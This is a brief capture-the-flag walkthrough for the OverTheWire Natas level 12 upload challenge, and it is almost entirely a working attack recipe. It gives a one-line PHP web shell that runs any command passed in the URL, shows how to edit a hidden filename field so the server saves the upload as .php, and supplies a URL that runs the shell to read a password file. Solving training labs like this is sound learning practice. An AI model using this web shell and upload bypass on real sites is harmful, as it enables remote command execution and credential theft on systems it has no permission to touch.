# Level 12 -> Level 13  

upload this php webshell  

```php
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```

change this portion in source code before uploading  

```html
<input type="hidden" name="filename" value="3oknjkmx27.jpg">
```

to

```html
<input type="hidden" name="filename" value="3oknjkmx27.php">
```

now execute the webshell  

```
http://natas12.natas.labs.overthewire.org/upload/k5uwtdrxxt.php?e=cat /etc/natas_webpass
```
